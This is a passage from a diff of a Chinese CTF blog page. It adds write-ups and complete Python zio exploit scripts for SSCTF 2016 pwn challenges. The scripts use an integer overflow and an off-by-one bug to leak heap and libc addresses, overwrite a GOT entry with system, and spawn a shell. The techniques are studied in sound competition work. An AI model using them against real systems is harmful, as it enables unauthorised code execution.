class="number">3</span>)</span><br><span class="line">        leak        = int(os.popen(<span class="string">'./leak '</span> + str(int(leak_time))).read())</span><br><span class="line">    <span class="keyword">if</span> leak ^ <span class="number">0x40000000</span> &gt;= <span class="number">0x40000000</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] random leak\t:\t'</span> + hex(leak)</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./pwn2-58461176'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment"># io.hint([0x80491e4])</span></span><br><span class="line"></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'sort'</span>, <span class="number">2</span>, leak ^ <span class="number">0x40000000</span>, <span class="number">0x40000000</span>])</span><br><span class="line">io.wl(<span class="number">3</span>)        <span class="comment"># sort</span></span><br><span class="line">io.wls([<span class="number">1</span>, <span class="number">2</span>])  <span class="comment"># query</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result:'</span>)</span><br><span class="line">heap_base = ctypes.c_uint32(int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>])).value - <span class="number">0x38</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap base\t:\t'</span> + hex(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">io.wls([<span class="number">2</span>, <span class="number">2</span>, heap_base + <span class="number">0x40</span>])</span><br><span class="line">io.wl(<span class="number">7</span>)        <span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reload</span></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'reload'</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">got_strtol = <span class="number">0x804c01c</span></span><br><span class="line">idx = str((got_strtol + <span class="number">0x100000000</span> - (heap_base + <span class="number">0x58</span>)) / <span class="number">4</span>)</span><br><span class="line">io.wls([<span class="number">1</span>, idx])</span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result:'</span>)</span><br><span class="line">adr_strtol  = ctypes.c_uint32(int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>])).value</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak strtol\t: \t'</span> + hex(adr_strtol)</span><br><span class="line">off_strtol  = <span class="number">0x000345c0</span></span><br><span class="line">libc_base   = adr_strtol - off_strtol</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] leak libc\t: \t'</span> + hex(libc_base)</span><br><span class="line">off_system  = <span class="number">0x00040190</span></span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack strtol@got</span></span><br><span class="line">io.wls([<span class="number">2</span>, idx, ctypes.c_int32(adr_system).value])</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">io.rtl(<span class="string">'Choose:'</span>)</span><br><span class="line">io.wl_af(<span class="string">'Choose:'</span>, <span class="string">'sh'</span>)</span><br><span class="line"></span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><ol>
+<li><a href="http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html" target="_blank" rel="external">http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr.html</a></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/09/02/ssctf-qual-2016-pwn1/" itemprop="url">
+                  ssctf-qual-2016-pwn1
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-02T00:00:00+08:00" content="2016-09-02">
+              2016-09-02
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/02/ssctf-qual-2016-pwn1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/02/ssctf-qual-2016-pwn1/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
+</blockquote>
+<h1 id="Conclusion">Conclusion</h1><h2 id="Bugs">Bugs</h2><ul>
+<li>integer overflow</li>
+<li>off by one bug</li>
+</ul>
+<p>很有意思的题目，只发现了<em>off-by-one bug</em><br><img src="/images/ssctf-qual-2016-pwn1/2.jpg" alt=""><br><img src="/images/ssctf-qual-2016-pwn1/3.jpg" alt=""></p>
+<p>可以利用这个bug泄露堆的地址，并伪造结构的size</p>
+<p>没有找到reload里的整数溢出，后来是参考了google上找到的writeup<a href="http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html" target="_blank" rel="external">[1]</a>，利用这个漏洞可以绕过如下所示的分配内存时的大小检查</p>
+<p><img src="/images/ssctf-qual-2016-pwn1/1.jpg" alt=""></p>
+<p>从而分配到一块size为<em>0x4000000</em>的结构，然后利用update函数实现任意地址读写，可以覆盖<code>got@strcpy</code></p>
+<p>不过这里遇到了一个疑惑，<code>memcpy</code>和<code>strcpy</code>的实际加载地址和libc中查找到的偏移不符，后来找到了这篇文章<a href="https://infosecguerrilla.wordpress.com/2016/07/28/glibc-strange-behavior/" target="_blank" rel="external">[2]</a>，关于gcc实现的<strong><em>indirect function</em></strong></p>
+<p>另外，很喜欢用<a href="https://github.com/zTrix/zio" target="_blank" rel="external">zio</a>，不过最近题目练多了，感觉打字有点麻烦，稍微修改了下几个函数的名字（重新定义了几个函数，实现其实就是调用原来的函数)，记录一下</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">origin      <span class="keyword">new</span></span><br><span class="line">--------    ----------------</span><br><span class="line"></span><br><span class="line">r           <span class="keyword">read</span></span><br><span class="line">rl          readline</span><br><span class="line">rls         <span class="keyword">readlines</span></span><br><span class="line">rtl         read_until</span><br><span class="line"></span><br><span class="line">w           <span class="keyword">write</span></span><br><span class="line">wl          <span class="keyword">writeline</span></span><br><span class="line">wls         writelines</span><br><span class="line"></span><br><span class="line">w_af        write_after</span><br><span class="line">wl_af       writeline_after</span><br><span class="line">wls_af      writelines_after</span><br><span class="line"></span><br><span class="line">gdb_hint    hint</span><br><span class="line">interact    itr</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./pwn1-fb39ccfa'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">io.hint([<span class="number">0x804959f</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x40000000 &lt;&lt; 2 + 1 = 0x4 (integer overflow !</span></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'sort'</span>, <span class="string">'1'</span>, str(<span class="number">0x40000000</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort</span></span><br><span class="line">io.wl_af(<span class="string">'Choose:'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-one leak</span></span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'1'</span>, <span class="string">'1'</span>])</span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result: '</span>)</span><br><span class="line">heap_base = int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>]) - <span class="number">0x38</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] heap base : '</span> + hex(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-one write</span></span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'2'</span>, <span class="string">'1'</span>, str(heap_base + <span class="number">0x3c</span>)])</span><br><span class="line">io.wl_af(<span class="string">'Choose:'</span>, <span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">io.wls_af(<span class="string">'_CMD_$'</span>, [<span class="string">'reload'</span>, <span class="string">'0'</span>])</span><br><span class="line"></span><br><span class="line">got_strcpy  = <span class="number">0x0804d03c</span></span><br><span class="line">idx  = str((got_strcpy + <span class="number">0x100000000</span> - (heap_base + <span class="number">0x4c</span>)) / <span class="number">4</span>)</span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'1'</span>, idx])</span><br><span class="line">io.rtl(<span class="string">'[*L*] Query result: '</span>)</span><br><span class="line"></span><br><span class="line">off_strcpy  = <span class="number">0x00139ad0</span>                        <span class="comment">#</span></span><br><span class="line">adr_strcpy  = ctypes.c_uint32(int(io.rl()[<span class="number">0</span>:-<span class="number">1</span>])).value</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] strcpy\t: '</span> + hex(adr_strcpy)</span><br><span class="line">libc_base   = adr_strcpy - off_strcpy</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base\t: '</span> + hex(libc_base)</span><br><span class="line">off_system  = <span class="number">0x00040190</span>                        <span class="comment"># 0x0003bc90</span></span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system\t: '</span> + hex(adr_system)</span><br><span class="line"></span><br><span class="line">val  = str(ctypes.c_int32(adr_system).value)</span><br><span class="line">io.wls_af(<span class="string">'Choose:'</span>, [<span class="string">'2'</span>, idx, val])</span><br><span class="line">io.wl(<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">io.wl_af(<span class="string">'_CMD_$'</span>, <span class="string">'sh'</span>)</span><br><span class="line"></span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><ol>
+<li><a href="http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html" target="_blank" rel="external">http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html</a></li>
+<li><a href="https://infosecguerrilla.wordpress.com/2016/07/28/glibc-strange-behavior/" target="_blank" rel="external">https://infosecguerrilla.wordpress.com/2016/07/28/glibc-strange-behavior/</a></li>
+</ol>
 
           
         
@@ -940,7 +965,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -981,7 +1006,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">32</span>
+              <span class="site-state-item-count">39</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -998,7 +1023,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-count">43</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -1045,6 +1070,10 @@
               
                 <li class="links-of-blogroll-item">
                   <a href="http://math1as.com" title="math1as" target="_blank">math1as</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://http://o0xmuhe.me" title="muhe" target="_blank">muhe</a>
                 </li>
               
             </ul>
